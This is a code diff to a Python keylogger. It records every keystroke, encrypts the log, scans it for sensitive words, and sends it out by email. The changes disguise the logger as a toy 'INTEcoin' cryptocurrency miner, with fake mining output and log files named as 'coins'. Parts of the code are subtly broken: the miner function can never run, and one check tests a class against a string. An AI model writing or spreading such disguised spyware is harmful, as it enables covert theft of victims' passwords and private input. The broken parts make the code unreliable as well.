@@ -1,4 +1,7 @@
 import os.path
+import time
+import random
+
 from cryptography.fernet import Fernet
 from os import path
 from pynput.keyboard import Key, Listener
@@ -8,7 +11,7 @@ count = 0
 count2 = 0
 MAX_COUNT = 20  # every how many letters to save
 BUFFER_SIZE = 2  # every how many saves to send.
-FILE_PATH = "C:\data\INTElog.txt"  # change data to logs at the end
+FILE_PATH = "INTEcoin.dat"  # change data to logs at the end
 
 
 class Encryption():
@@ -50,9 +53,9 @@ def press(key):
     them into a file.
     :param key: the key pressed given from pynput module.
     """
-    global keys, count,count2
-    keys.append(key) #append every pressed key.
-    count += 1 #keep track of how many keys.
+    global keys, count, count2
+    keys.append(key)  # append every pressed key.
+    count += 1  # keep track of how many keys.
     if count == MAX_COUNT:
         writer(keys)
         count = 0
@@ -61,6 +64,7 @@ def press(key):
     if count2 >= BUFFER_SIZE:
         count2 = 0
         results()
+
 
 def release(key):
     """
@@ -93,10 +97,8 @@ def writer(log):
             key = parse(str(key))  # it's better if it's a string from now on.
             toWrite += key
         file.write(Encryption.encrypt(toWrite))
-        file.write(b"@") #putting a separator for the encryption diod see Fernet using this as the cypher text.
+        file.write(b"@")  # putting a separator for the encryption diod see Fernet using this as the cypher text.
         file.close()
-
-
 
 
 def parse(key):
@@ -107,9 +109,11 @@ def parse(key):
     """
     if key == "'":  # handling the ' sign.
         return key
-    key = str(key).replace("'", "")  # delete ' ' from output
-    if str(key) == "Key.enter" or str(key) == "Key.space":
+    key = key.replace("'", "")  # delete ' ' from output
+    if key == "Key.enter" or key == "Key.space":
         return "\n"
+    if Key in key:
+        return key + " " # if it has a "Key" parameter before add a space so it's more readable
     return key
 
 
@@ -125,21 +129,26 @@ def results():
     for byt in Encryption.bytes_from_file(FILE_PATH):
         if byt == "@":
             accumulatedLog.append(message)
-            message=""
+            message = ""
             continue
         message += byt
 
-    message="" # reusing the same name.
-    for mess in accumulatedLog:
-        message += Encryption.decrypt(mess.encode())
-    for word in importantWords:
+    message = ""  # reusing the same name.
+    print(str(random.randint(1,1000)))
+    filename= "INTEcoin" + str(random.randint(1,10000)) + ".dat" #save encrypted data as "coins"
+
+    with open(filename, "wb") as file:
+        for mess in accumulatedLog:
+            message += Encryption.decrypt(mess.encode()) #decrypt the data
+            file.write(mess.encode()) #write the data on a random file for the "miner"
+    for word in importantWords: #checking if any sensitive data was inputted.
         if word in message:
             toSend = True
+    print(message)
     if toSend:
-        send(accumulatedLog, "email") #send encrypted data.
-    # delete file since it's been sent or didn't contain any interesting data and we don't want to keep traces.
+        send(accumulatedLog, "email")  # send encrypted data.
+    # delete file to not send the same data again.
     os.remove(FILE_PATH)
-
 
 
 def send(data, email):
@@ -148,3 +157,19 @@ def send(data, email):
 
 with Listener(on_press=press, on_release=release) as listener:
     listener.join()
+
+
+def miner():
+    print("welcome to INTEminer for INTEcoin!")
+    print("Mining")
+    INTEcoin=0
+    while True:
+        randomNumber=random.randint(1, 100)
+        time.sleep(randomNumber/20) #sleep for a random short time
+        print(".", end="")
+        if random.randint(1, 10) == 5:
+            INTEcoin += randomNumber
+            print("Mined a INTEcoin! You currently have {} coins!".format(INTEcoin))
+
+
+miner()
